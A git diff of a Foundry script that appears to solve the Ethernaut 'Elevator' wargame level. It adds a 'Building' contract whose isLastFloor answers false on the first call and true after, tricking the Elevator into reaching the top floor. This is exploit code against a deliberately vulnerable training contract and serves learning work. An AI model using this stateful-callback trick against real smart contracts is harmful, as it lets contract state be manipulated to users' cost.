@@ -19,15 +19,11 @@ contract ElevatorSolution is Script, EthernautHelper {
         ////////////////////////////////////////////////////////////////////////////////////
         // Start of Ric Li C's Solution
         ////////////////////////////////////////////////////////////////////////////////////
-        // Step 1: Get Elevator contract;
-        Elevator elevator = Elevator(payable(challengeInstance));
+        // Step 1: Deploy Building contract;
+        Building building = new Building(challengeInstance);
 
-        // Step 2: Call `XXXXX()` function of Elevator contract,
-        //         YYYYY;
-
-        // Step 3: Confirm that caller `heroAddress` has successfully obtained ownership of the Elevator contract.
-        address heroAddress = vm.addr(heroPrivateKey);
-        require(heroAddress == Elevator.owner(), "Owner check failed");
+        // Step 2: Call `goTopFloor()` function of the Building contract,
+        building.goTopFloor();
 
         ////////////////////////////////////////////////////////////////////////////////////
         // End of Ric Li C's Solution
@@ -41,3 +37,40 @@ contract ElevatorSolution is Script, EthernautHelper {
         console2.log(successMessage(11));
     }
 }
+
+////////////////////////////////////////////////////////////////////////////////////
+// Start of Ric Li C's Solution (Extra Contract)
+// Additional contract codes to help solve this puzzle
+////////////////////////////////////////////////////////////////////////////////////
+contract Building {
+    Elevator elevator;
+
+    // State variable to track if isLastFloor has been called before
+    bool private firstCall = true;
+
+    // Total number of floors
+    uint public totalFloors = 10;
+
+    constructor(address elevatorAddress) {
+        elevator = Elevator(elevatorAddress);
+    }
+
+    function isLastFloor(uint _floor) external returns (bool) {
+        // If it's the first call, return false
+        if (firstCall) {
+            firstCall = false; // Set firstCall to false for subsequent calls
+            return false;
+        }
+
+        // After the first call, return true if the floor is the last floor
+        return _floor == totalFloors;
+    }
+
+    function goTopFloor() external {
+        elevator.goTo(totalFloors);
+    }
+}
+
+////////////////////////////////////////////////////////////////////////////////////
+// End of Ric Li C's Solution (Extra Contract)
+////////////////////////////////////////////////////////////////////////////////////
